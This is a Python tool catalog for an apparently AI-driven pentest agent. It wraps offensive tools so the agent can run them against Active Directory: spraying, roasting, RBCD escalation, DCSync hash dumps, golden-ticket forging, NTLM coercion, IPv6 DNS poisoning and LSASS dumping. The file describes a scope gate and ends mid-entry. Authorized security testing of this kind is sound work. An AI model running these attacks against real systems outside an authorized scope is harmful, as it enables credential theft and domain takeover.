# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""The tool catalog: declarative specs for the full pentest toolbox.

Each entry is a CommandSpec. The registry loads whichever tools are actually
installed on the host, so the agent only ever sees tools it can run. Tools are
grouped by domain (network, web, smb/ad, credentials). Every spec resolves a
host to authorize before running — the scope gate applies to all of them.

Wordlist defaults point at paths present on a default Kali install.
"""
from __future__ import annotations

import re as _re
from typing import Any

from ..facts import HarvestRule
from .command import (CommandSpec, host_from_domain, host_from_target,
                      host_from_url)

# Common wordlists shipped with Kali.
WL_DIR = "/usr/share/wordlists/dirb/common.txt"
WL_USERS = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
WL_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
# Matches a bare subdomain/host on its own line (subfinder/amass -silent output).
_SUBDOMAIN_RE = r"^([a-z0-9][a-z0-9._\-]*\.[a-z]{2,})$"


def _s(v: Any) -> str:
    return str(v)


def _local_ip_for(target: str) -> str:
    """Source IP the OS would use to reach *target* (no packets sent). Used to
    default a coercion/relay listener to our own address on the right interface."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except OSError:
        return ""
    finally:
        s.close()


def _flag(args: list[str], kwargs: dict, key: str, flag: str) -> None:
    """Append `flag value` when the model supplied `key`."""
    if kwargs.get(key) not in (None, ""):
        args.extend([flag, _s(kwargs[key])])


def _creds(kwargs: dict) -> list[str]:
    out: list[str] = []
    _flag(out, kwargs, "username", "-u")
    _flag(out, kwargs, "password", "-p")
    return out


def _nxc_auth(k: dict, guest_default: bool = False) -> list[str]:
    """NetExec auth fragment supporting password OR pass-the-hash, an empty
    password (guest/null session), and an optional domain.

    - username + hash  -> -u user -H <ntlm>   (pass-the-hash)
    - username + pass  -> -u user -p <pass>
    - username only    -> -u user -p ''       (guest/null session)
    - guest_default    -> defaults username to 'guest' when none supplied
    """
    out: list[str] = []
    user = k.get("username") or ("guest" if guest_default else "")
    if user:
        out += ["-u", _s(user)]
    if k.get("hash"):
        out += ["-H", _s(k["hash"])]
    elif user:
        out += ["-p", _s(k.get("password", "") or "")]
    if k.get("domain"):
        out += ["-d", _s(k["domain"])]
    return out


# Reusable parameter fragments -------------------------------------------------
_TARGET = {"target": {"type": "string", "description": "Host or IP."}}
_URL = {"url": {"type": "string", "description": "Full URL incl. scheme/port."}}
_AUTH = {
    "username": {"type": "string", "description": "Username (optional)."},
    "password": {"type": "string", "description": "Password (optional)."},
}
# Auth fragment that also allows pass-the-hash and a domain (for AD tooling).
_AUTH_H = {
    **_AUTH,
    "hash": {"type": "string", "description": "NTLM hash for pass-the-hash "
             "(use instead of password, e.g. from a dumped/backup credential)."},
}
_DOMAIN = {"domain": {"type": "string", "description": "Domain, e.g. corp.local or example.com."}}
_WORDLIST = {"wordlist": {"type": "string", "description": "Wordlist path (optional)."}}
_HASHFILE = {"hashfile": {"type": "string", "description": "Path to a file of hashes to crack."}}


def _params(props: dict, required: list[str]) -> dict:
    return {"type": "object", "properties": props, "required": required}


CATALOG: list[CommandSpec] = [

    # ---- Network / service discovery ------------------------------------
    CommandSpec(
        name="masscan",
        description="Very fast Internet-scale TCP port sweep of a host/range. "
                    "Use to find open ports quickly before nmap version scans.",
        binary="masscan",
        parameters=_params({**_TARGET,
            "ports": {"type": "string", "description": "e.g. '1-65535' or '80,443'. Default 1-1000."},
            "rate": {"type": "string", "description": "Packets/sec. Default 1000."}},
            ["target"]),
        build_args=lambda k: [_s(k["target"]), "-p", _s(k.get("ports", "1-1000")),
                              "--rate", _s(k.get("rate", "1000")), "-oL", "-"],
        install_hint="apt install masscan (needs root/CAP_NET_RAW).",
    ),
    CommandSpec(
        name="dns_recon",
        description="Enumerate DNS records and attempt zone transfer against a "
                    "domain's nameserver. Good for AD domains.",
        binary="dnsrecon",
        parameters=_params({**_TARGET, **_DOMAIN},
            ["target", "domain"]),
        build_args=lambda k: ["-n", _s(k["target"]), "-d", _s(k["domain"]), "-a"],
        install_hint="apt install dnsrecon.",
    ),

    # ---- Web ------------------------------------------------------------
    CommandSpec(
        name="whatweb",
        description="Fingerprint a web app: server, CMS, frameworks, versions.",
        binary="whatweb",
        parameters=_params({**_URL, "aggression": {"type": "string",
            "description": "1 (stealthy) to 3 (aggressive). Default 1."}}, ["url"]),
        build_args=lambda k: [f"-a{_s(k.get('aggression','1'))}", _s(k["url"])],
        host_resolver=host_from_url,
        install_hint="apt install whatweb.",
    ),
    CommandSpec(
        name="nikto",
        description="Scan a web server for known vulnerabilities, dangerous "
                    "files, and misconfigurations.",
        binary="nikto",
        parameters=_params(_URL, ["url"]),
        build_args=lambda k: ["-h", _s(k["url"]), "-ask", "no"],
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install nikto.",
    ),
    CommandSpec(
        name="nuclei",
        description="Run Nuclei templated vulnerability checks against a URL. "
                    "Optionally filter by severity (critical,high,medium).",
        binary="nuclei",
        parameters=_params({**_URL, "severity": {"type": "string",
            "description": "Comma list e.g. 'critical,high'. Optional."}}, ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "-silent", "-nc"]
                             + (["-severity", _s(k["severity"])] if k.get("severity") else []),
        host_resolver=host_from_url, timeout=1800,
        install_hint="Install from projectdiscovery (nuclei).",
    ),
    CommandSpec(
        name="ffuf",
        description="Fuzz for hidden web content/directories. Put FUZZ in the "
                    "URL where the wordlist should be inserted.",
        binary="ffuf",
        parameters=_params({
            "url": {"type": "string", "description": "URL with FUZZ keyword, e.g. http://h/FUZZ"},
            "wordlist": {"type": "string", "description": f"Wordlist path. Default {WL_DIR}."},
            "extensions": {"type": "string", "description": "e.g. '.php,.txt'. Optional."}},
            ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "-w", _s(k.get("wordlist", WL_DIR)),
                              "-mc", "200,204,301,302,307,401,403", "-s"]
                             + (["-e", _s(k["extensions"])] if k.get("extensions") else []),
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install ffuf.",
    ),
    CommandSpec(
        name="gobuster_dir",
        description="Brute-force web directories/files with gobuster.",
        binary="gobuster",
        parameters=_params({**_URL,
            "wordlist": {"type": "string", "description": f"Default {WL_DIR}."}}, ["url"]),
        build_args=lambda k: ["dir", "-u", _s(k["url"]), "-w",
                              _s(k.get("wordlist", WL_DIR)), "-q"],
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install gobuster.",
    ),
    CommandSpec(
        name="wpscan",
        description="Scan a WordPress site for vulnerable plugins/themes/users.",
        binary="wpscan",
        parameters=_params({**_URL,
            "enumerate": {"type": "string", "description": "e.g. 'vp,u' (vuln plugins, users). Optional."}}, ["url"]),
        build_args=lambda k: ["--url", _s(k["url"]), "--no-banner",
                              "--random-user-agent"]
                             + (["-e", _s(k["enumerate"])] if k.get("enumerate") else []),
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install wpscan.",
    ),
    CommandSpec(
        name="sqlmap",
        description="Test a URL for SQL injection (automated). Intrusive.",
        binary="sqlmap",
        parameters=_params({**_URL,
            "data": {"type": "string", "description": "POST body to test. Optional."},
            "level": {"type": "string", "description": "1-5 test depth. Default 1."}}, ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "--batch",
                              "--level", _s(k.get("level", "1"))]
                             + (["--data", _s(k["data"])] if k.get("data") else []),
        host_resolver=host_from_url, timeout=1800,
        install_hint="apt install sqlmap.",
    ),

    # ---- SMB / Active Directory -----------------------------------------
    # Reference example of the DECLARATIVE style: no build_args lambda — argv is
    # assembled from subcommand + positional + flags. The flag map is the
    # canonical-variable → CLI-switch translation (username → -u, etc.).
    CommandSpec(
        name="netexec_smb",
        description="Enumerate/authenticate SMB on a host with NetExec: OS/domain "
                    "info; with creds or a hash (pass-the-hash) it lists "
                    "shares/users/pass-pol, and can run a command (-x) when the "
                    "account is admin (look for 'Pwn3d!'). protocol fixed to smb.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "enumerate": {"type": "string", "description": "One of: shares, users, "
                          "groups, pass-pol, loggedon-users, sessions, disks. Optional."},
            "command": {"type": "string", "description": "Command to run via -x when "
                        "the account is a local admin (optional)."}},
            ["target"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
                             + (["--" + _s(k["enumerate"])] if k.get("enumerate") else [])
                             + (["-x", _s(k["command"])] if k.get("command") else []),
        install_hint="pipx install netexec (provides nxc).",
    ),
    CommandSpec(
        name="netexec_rid_brute",
        description="Enumerate ALL domain users by RID-cycling over SMB. Works with a "
                    "guest/null session (no creds) or any valid account — the primary "
                    "way to build a user list on an AD DC when you have none.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "max_rid": {"type": "string", "description": "Highest RID to try. Default 4000."}},
            ["target"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k, guest_default=True)
                             + ["--rid-brute", _s(k.get("max_rid", "4000"))],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="netexec_spray",
        description="Password-spray a user list over SMB in ONE batch (server-side, "
                    "fast) — this is the correct way to test many accounts, never "
                    "one-by-one. Give userfile plus either a single password, a "
                    "passfile, or userpass='true' to try username==password. Uses "
                    "--no-bruteforce (one attempt per user) to avoid lockout.",
        binary="nxc",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userfile": {"type": "string", "description": "Path to a usernames file (one per line)."},
            "password": {"type": "string", "description": "Single password to spray (optional)."},
            "passfile": {"type": "string", "description": "Path to a passwords file (optional)."},
            "userpass": {"type": "string", "description": "'true' to try username==password."}},
            ["target", "userfile"]),
        build_args=lambda k: ["smb", _s(k["target"]), "-u", _s(k["userfile"]), "-p",
                              (_s(k["userfile"]) if _s(k.get("userpass", "")).lower()
                               in ("true", "1", "yes")
                               else _s(k["passfile"]) if k.get("passfile")
                               else _s(k.get("password", "")))]
                             + (["-d", _s(k["domain"])] if k.get("domain") else [])
                             + ["--no-bruteforce", "--continue-on-success"],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="smb_get",
        description="Download a file from an SMB share (creds or pass-the-hash) to "
                    "loot it — e.g. a backup/config that leaks credentials. Saves to "
                    "the logs dir. Give the share name and the remote file path.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "share": {"type": "string", "description": "Share name, e.g. backup."},
            "path": {"type": "string", "description": "Remote file path in the share, e.g. backup_extract.txt."}},
            ["target", "share", "path"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
                             + ["--share", _s(k["share"]), "--get-file", _s(k["path"]),
                                "loot_" + _s(k["path"]).replace("\\", "_").replace("/", "_")],
        install_hint="pipx install netexec.",
    ),
    # Added purely declaratively — shows how little a new tool needs.
    CommandSpec(
        name="netexec_winrm",
        description="Check WinRM (5985/5986) access with NetExec (creds or "
                    "pass-the-hash) and run a command (default whoami). Validates that "
                    "an account gives remote code execution ('Pwn3d!').",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "command": {"type": "string", "description": "Command to run (default whoami)."}},
            ["target"]),
        build_args=lambda k: ["winrm", _s(k["target"])] + _nxc_auth(k)
                             + ["-x", _s(k.get("command") or "whoami")],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="netexec_ldap",
        description="Query LDAP/AD via NetExec (with creds): users, groups, and "
                    "Kerberoast/asreproast discovery.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "action": {"type": "string", "description": "e.g. '--users', "
                       "'--kerberoasting out.txt', '--asreproast out.txt'. Optional."}},
            ["target"]),
        build_args=lambda k: ["ldap", _s(k["target"])] + _nxc_auth(k)
                             + (_s(k["action"]).split() if k.get("action") else []),
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="enum4linux",
        description="Comprehensive SMB/RPC enumeration (users, shares, groups, "
                    "policy) against a Windows/Samba host.",
        binary="enum4linux-ng",
        parameters=_params({**_TARGET, **_AUTH}, ["target"]),
        build_args=lambda k: ["-A", _s(k["target"])]
                             + (["-u", _s(k["username"]), "-p", _s(k.get("password", ""))]
                                if k.get("username") else []),
        aliases=["enum4linux"], install_hint="apt install enum4linux-ng.",
    ),
    CommandSpec(
        name="smbmap",
        description="List SMB shares and access levels on a host, with optional creds.",
        binary="smbmap",
        parameters=_params({**_TARGET, **_AUTH,
            **_DOMAIN}, ["target"]),
        build_args=lambda k: ["-H", _s(k["target"])] + _creds(k)
                             + (["-d", _s(k["domain"])] if k.get("domain") else []),
        install_hint="apt install smbmap.",
    ),
    CommandSpec(
        name="smbclient_shares",
        description="List available SMB shares anonymously (null session).",
        binary="smbclient",
        parameters=_params(_TARGET, ["target"]),
        build_args=lambda k: ["-L", f"//{_s(k['target'])}/", "-N"],
        install_hint="apt install smbclient.",
    ),
    CommandSpec(
        name="ldapsearch_anon",
        description="Anonymous LDAP query of an AD domain controller. Returns "
                    "directory entries if anonymous bind is allowed.",
        binary="ldapsearch",
        parameters=_params({**_TARGET,
            "base_dn": {"type": "string", "description": "e.g. DC=corp,DC=local"},
            "filter": {"type": "string", "description": "LDAP filter. Default (objectclass=*)."}},
            ["target", "base_dn"]),
        build_args=lambda k: ["-x", "-H", f"ldap://{_s(k['target'])}", "-b",
                              _s(k["base_dn"]), _s(k.get("filter", "(objectclass=*)"))],
        install_hint="apt install ldap-utils.",
    ),
    CommandSpec(
        name="kerbrute_userenum",
        description="Enumerate valid AD usernames via Kerberos pre-auth (no "
                    "lockout). Needs a username wordlist and the domain.",
        binary="kerbrute",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userlist": {"type": "string", "description": f"Path to usernames. Default {WL_USERS}."}},
            ["target", "domain"]),
        build_args=lambda k: ["userenum", "--dc", _s(k["target"]), "-d",
                              _s(k["domain"]), _s(k.get("userlist", WL_USERS))],
        install_hint="Install kerbrute (ropnop).",
    ),
    CommandSpec(
        name="asrep_roast",
        description="AS-REP roasting: request Kerberos tickets for users without "
                    "pre-auth. Needs a usernames file; no password required.",
        binary="impacket-GetNPUsers",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userlist": {"type": "string", "description": "Path to usernames file."}},
            ["target", "domain", "userlist"]),
        build_args=lambda k: [f"{_s(k['domain'])}/", "-usersfile", _s(k["userlist"]),
                              "-dc-ip", _s(k["target"]), "-no-pass", "-request",
                              "-format", "hashcat"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="kerberoast",
        description="Kerberoasting: request service tickets (SPNs) for offline "
                    "cracking. Requires valid domain credentials.",
        binary="impacket-GetUserSPNs",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        # No -outputfile: -request prints the $krb5tgs$ hashes to stdout so they are
        # captured in the transcript (harvested for cracking AND detected as a finding).
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
                              "-dc-ip", _s(k["target"]), "-request"],
        install_hint="pipx install impacket.",
    ),
    # ---- Resource-Based Constrained Delegation (RBCD) -> Domain Admin -------
    CommandSpec(
        name="add_computer",
        description="Create a new AD computer account (needs MachineAccountQuota>0). "
                    "Used as the controlled principal for an RBCD attack. Needs valid "
                    "domain credentials. Default computer ATTACK$ / Attack123!.",
        binary="impacket-addcomputer", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "computer_name": {"type": "string", "description": "New computer name without $ (default ATTACK)."},
            "computer_pass": {"type": "string", "description": "Password for the new computer (default Attack123!)."}},
            ["target", "domain", "username", "password"]),
        build_args=lambda k: ["-computer-name", _s(k.get("computer_name", "ATTACK")) + "$",
                              "-computer-pass", _s(k.get("computer_pass", "Attack123!")),
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="rbcd",
        description="Configure Resource-Based Constrained Delegation: grant a "
                    "computer/account you control the right to act on behalf of "
                    "others on a target (write msDS-AllowedToActOnBehalfOfOtherIdentity). "
                    "Needs creds for a principal with write over the target computer.",
        binary="impacket-rbcd", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "delegate_from": {"type": "string", "description": "Account you control (default ATTACK$)."},
            "delegate_to": {"type": "string", "description": "Target computer, e.g. DC01$."}},
            ["target", "domain", "username", "password", "delegate_to"]),
        build_args=lambda k: ["-delegate-from", _s(k.get("delegate_from") or "ATTACK$"),
                              "-delegate-to", _s(k["delegate_to"]), "-action", "write",
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="get_st",
        description="Request a service ticket impersonating a user via S4U2Proxy "
                    "(after RBCD/constrained delegation). Saves a .ccache; set "
                    "KRB5CCNAME to it and use -k with impacket/nxc. E.g. impersonate "
                    "Administrator for cifs/DC01 to get admin on the DC.",
        binary="impacket-getST", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "spn": {"type": "string", "description": "Target SPN, e.g. cifs/DC01.ctf.local."},
            "impersonate": {"type": "string", "description": "User to impersonate (default Administrator)."}},
            ["target", "domain", "username", "password", "spn"]),
        build_args=lambda k: ["-spn", _s(k["spn"]),
                              "-impersonate", _s(k.get("impersonate") or "Administrator"),
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="getTGT",
        description="Request a Kerberos TGT for a user (overpass-the-hash / pass-the-key) "
                    "and save a .ccache. Authenticate with a password OR an NT hash; then "
                    "export KRB5CCNAME and use -k with impacket/nxc to act as that user "
                    "over Kerberos without the plaintext.",
        binary="impacket-getTGT", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H}, ["target", "domain", "username"]),
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}"
                              + (f":{_s(k['password'])}" if k.get('password') and not k.get('hash') else "")]
                             + (["-hashes", f":{_s(k['hash'])}"] if k.get("hash") else [])
                             + ["-dc-ip", _s(k["target"])],
        harvest=[HarvestRule("ccache", r"Saving ticket in\s+(\S+\.ccache)")],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="certipy_find",
        description="Enumerate Active Directory Certificate Services (AD CS): "
                    "CAs and certificate templates, flagging vulnerable ones "
                    "(ESC1-ESC8). Needs valid domain credentials.",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        build_args=lambda k: ["find", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                              "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp",
                              "-stdout", "-vulnerable"],
        # harvest the CA + a vulnerable template name so certipy_req auto-fills them
        # (full ADCS chaining: find -> req -> auth). -vulnerable output only lists
        # vulnerable templates, so the first Template Name is an abusable one.
        harvest=[HarvestRule("ca", r"CA Name\s*:\s*(\S+)"),
                 HarvestRule("template", r"Template Name\s*:\s*(\S+)")],
        aliases=["certipy"], timeout=600,
        install_hint="pipx install certipy-ad (point DNS at a DC — the DC is the name server).",
    ),
    CommandSpec(
        name="bloodhound_python",
        description="Collect Active Directory data (users, groups, ACLs, "
                    "sessions, trusts) for BloodHound analysis. Needs valid "
                    "domain credentials; the DC IP is the name server.",
        binary="bloodhound-python", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        flags={"domain": "-d", "username": "-u", "password": "-p", "target": "-ns"},
        fixed=["-c", "all", "--zip"], timeout=1200,
        aliases=["bloodhound.py"], install_hint="pipx install bloodhound.",
    ),
    CommandSpec(
        name="secretsdump",
        description="Dump password hashes with valid credentials: local SAM/LSA on a "
                    "host, or DCSync a whole domain (just_dc=true) against a DC with a "
                    "Domain-Admin / DC account — via password or pass-the-hash. "
                    "Highly intrusive — post-exploitation.",
        binary="impacket-secretsdump", category="credentials",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H,
            "just_dc": {"type": "string", "description": "'true' to DCSync the domain "
                        "over DRSUAPI (-just-dc-ntlm): fast, DC-only, skips SAM/LSA."}},
            ["target", "username"]),
        build_args=lambda k: (
            [f"{_s(k.get('domain',''))}/{_s(k['username'])}"
             + (f":{_s(k['password'])}" if k.get("password") else "")
             + f"@{_s(k['target'])}"]
            + (["-hashes", f":{_s(k['hash'])}", "-no-pass"] if k.get("hash") else [])
            + (["-just-dc-ntlm"] if _s(k.get("just_dc", "")).lower()
               in ("true", "1", "yes") else [])),
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="netexec_mssql",
        description="Authenticate to MSSQL (1433) with NetExec using Windows or SQL "
                    "auth, run a T-SQL query (-q) or an OS command via xp_cmdshell (-x, "
                    "auto-enabled when the login is privileged). Turns a SQL foothold "
                    "into command execution as the service account (then SYSTEM).",
        binary="nxc", category="ad-smb",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "query": {"type": "string", "description": "T-SQL query to run (optional)."},
            "command": {"type": "string", "description": "OS command via xp_cmdshell (optional)."},
            "local_auth": {"type": "string", "description": "'true' for a local SQL login instead of Windows auth."}},
            ["target"]),
        build_args=lambda k: ["mssql", _s(k["target"])] + _nxc_auth(k)
                             + (["--local-auth"] if _s(k.get("local_auth", "")).lower()
                                in ("true", "1", "yes") else [])
                             + (["-q", _s(k["query"])] if k.get("query") else [])
                             + (["-x", _s(k["command"])] if k.get("command") else []),
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="ticketer",
        description="Forge a Kerberos ticket OFFLINE. Golden ticket: give the krbtgt NT "
                    "hash for full-domain persistence. Silver ticket: give a service "
                    "account's NT hash plus its SPN for access to one service. Writes "
                    "<user>.ccache; export KRB5CCNAME to it and use -k with impacket/nxc.",
        binary="impacket-ticketer", category="ad-smb", requires_host=False,
        host_resolver=host_from_domain,
        parameters=_params({**_DOMAIN,
            "nthash": {"type": "string", "description": "NT hash: krbtgt (golden) or the service account (silver)."},
            "domain_sid": {"type": "string", "description": "Domain SID, e.g. S-1-5-21-…."},
            "username": {"type": "string", "description": "User to forge the ticket for (e.g. Administrator)."},
            "spn": {"type": "string", "description": "Service SPN for a SILVER ticket (omit for golden)."}},
            ["domain", "nthash", "domain_sid", "username"]),
        build_args=lambda k: ["-nthash", _s(k["nthash"]), "-domain-sid", _s(k["domain_sid"]),
                              "-domain", _s(k["domain"])]
                             + (["-spn", _s(k["spn"])] if k.get("spn") else [])
                             + [_s(k["username"])],
        harvest=[HarvestRule("ccache", r"Saving ticket in\s+(\S+\.ccache)")],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="certipy_req",
        description="Request a certificate from a vulnerable AD CS template (ESC1/ESC2/…): "
                    "with -upn you enroll a cert AS another user (e.g. administrator) and "
                    "get their .pfx. Needs a domain credential and the CA + template names "
                    "from certipy_find.",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "ca": {"type": "string", "description": "CA name (from certipy_find), e.g. SEVENKINGDOMS-CA."},
            "template": {"type": "string", "description": "Vulnerable template name, e.g. ESC1."},
            "upn": {"type": "string", "description": "User to impersonate, e.g. administrator@domain."}},
            ["target", "domain", "username", "password", "ca", "template"]),
        build_args=lambda k: ["req", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                              "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp",
                              "-ca", _s(k["ca"]), "-template", _s(k["template"]),
                              # impersonate the domain admin by default (ESC1)
                              "-upn", _s(k.get("upn") or f"administrator@{_s(k['domain'])}")],
        harvest=[HarvestRule("pfx", r"Saved certificate and private key to '([^']+\.pfx)'")],
        aliases=["certipy"], timeout=600, install_hint="pipx install certipy-ad.",
    ),
    CommandSpec(
        name="certipy_auth",
        description="Authenticate with a certificate (.pfx from certipy_req) to recover "
                    "the target user's NT hash and a Kerberos TGT — completing an AD CS "
                    "ESC escalation to that user (often Domain Admin).",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET,
            "pfx": {"type": "string", "description": "Path to the .pfx from certipy_req."}},
            ["target", "pfx"]),
        build_args=lambda k: ["auth", "-pfx", _s(k["pfx"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp"],
        harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
        aliases=["certipy"], install_hint="pipx install certipy-ad.",
    ),
    CommandSpec(
        name="coercer",
        description="Coerce a Windows host (DC/server) into authenticating to an "
                    "attacker-controlled listener over MS-RPRN (PrinterBug), MS-EFSR "
                    "(PetitPotam), MS-DFSNM, etc. This is the trigger for an NTLM relay "
                    "or a NetNTLM capture. Needs a domain credential and a listener IP "
                    "(your host). Pair with a running ntlmrelayx / responder.",
        binary="coercer", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "listener": {"type": "string", "description": "Attacker IP the target should "
                         "authenticate to. Defaults to our IP on the route to the target."}},
            ["target"]),
        build_args=lambda k: ["coerce", "-t", _s(k["target"]),
                              "-l", _s(k.get("listener") or _local_ip_for(_s(k["target"])))]
                             + (["-u", _s(k["username"]), "-p", _s(k.get("password", "")),
                                 "-d", _s(k.get("domain", ""))] if k.get("username") else [])
                             # --always-continue: run every coercion method without the
                             # interactive "Continue/Skip/Stop?" prompt, which stalls in a
                             # detached job (no TTY) after the first NO_AUTH_RECEIVED and
                             # blocks the relay from ever receiving the coerced auth.
                             + ["--always-continue", "-v"],
        timeout=300, install_hint="pipx install coercer.",
    ),
    CommandSpec(
        name="mitm6",
        description="IPv6 DNS takeover: answer Windows DHCPv6 / IPv6 name resolution so "
                    "segment hosts use YOU as their DNS, then reply to WPAD and internal "
                    "lookups to coerce NTLM authentication — feed it to a running "
                    "ntlmrelayx (LDAP / AD CS) for domain takeover. The classic "
                    "no-credentials, on-the-wire internal foothold. INTRUSIVE: poisons "
                    "the whole segment — authorized use only, alongside a relay listener.",
        binary="mitm6", category="ad-smb", active=True,
        parameters=_params({**_DOMAIN,
            "interface": {"type": "string", "description": "Attacker NIC to bind (e.g. eth0)."},
            "target_domain": {"type": "string", "description": "AD domain to spoof (fqdn); "
                              "defaults to the engagement 'domain'."}},
            []),
        build_args=lambda k: (["-i", _s(k["interface"])] if k.get("interface") else [])
                             + (["-d", _s(k.get("target_domain") or k.get("domain"))]
                                if (k.get("target_domain") or k.get("domain")) else [])
                             + ["--ignore-nofqdn"],
        timeout=600, install_hint="pipx install mitm6.",
    ),
    CommandSpec(
        name="lsassy",
        description="Remotely dump and parse LSASS on a host you have local admin on to "
                    "recover logged-on credentials (plaintext passwords, NT hashes) and "
                    "Kerberos material — without dropping mimikatz on disk. "
                    "Post-exploitation; needs local admin (Pwn3d!).",
        binary="lsassy", category="credentials",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN}, ["target"]),
        build_args=lambda k: (["-d", _s(k["domain"])] if k.get("domain") else [])
                             + (["-u", _s(k["username"])] if k.get("username") else [])
                             + (["-p", _s(k["password"])] if k.get("password") else [])
                             + (["-H", _s(k["hash"])] if k.get("hash") else [])
                             + [_s(k["target"])],
        install_hint="pipx install lsassy.",
    ),
    CommandSpec(
        name="finddelegation",
        description="Enumerate Kerberos delegation across the domain: unconstrained, "
                    "constrained (AllowedToDelegate), and resource-based (RBCD). Needs a "
                    "domain credential. Flags the accounts abusable for privilege escalation.",
        binary="impacket-findDelegation", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
                              "-dc-ip", _s(k["target"])],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="targeted_kerberoast",
        description="Targeted Kerberoasting: for every account you can write to (from an "
                    "abusable ACL), temporarily set an SPN, request+roast its ticket, then "
                    "clean up. Turns GenericAll/GenericWrite over a user into a crackable "
                    "$krb5tgs$ hash. Needs a domain credential.",
        binary="targetedKerberoast", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "request_user": {"type": "string", "description": "Roast one specific user (optional)."}},
            ["target", "domain", "username", "password"]),
        build_args=lambda k: ["-v", "-d", _s(k["domain"]), "-u", _s(k["username"]),
                              "-p", _s(k["password"]), "--dc-ip", _s(k["target"])]
                             + (["--request-user", _s(k["request_user"])] if k.get("request_user") else []),
        aliases=["targetedKerberoast.py", "targetedKerberoast"],
        install_hint="pipx install targetedKerberoast.",
    ),
    CommandSpec(
        name="bloodyad",
        description="Swiss-army AD read/write over LDAP for ACL abuse: enumerate writable "
                    "objects, add a group member, set a password, grant genericAll, set an "
                    "owner, or add a shadow credential. Give the action string (default "
                    "'get writable' — a safe read that finds what your account can abuse).",
        binary="bloodyAD", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H,
            "action": {"type": "string", "description": "bloodyAD action, e.g. "
                       "'get writable', 'add groupMember <group> <member>', "
                       "'set password <user> <newpass>', 'add genericAll <target> <grantee>'."}},
            ["target", "domain", "username"]),
        build_args=lambda k: ["--host", _s(k["target"]), "-d", _s(k["domain"]),
                              "-u", _s(k["username"])]
                             + (["-p", ":" + _s(k["hash"])] if k.get("hash")
                                else ["-p", _s(k.get("password", ""))])
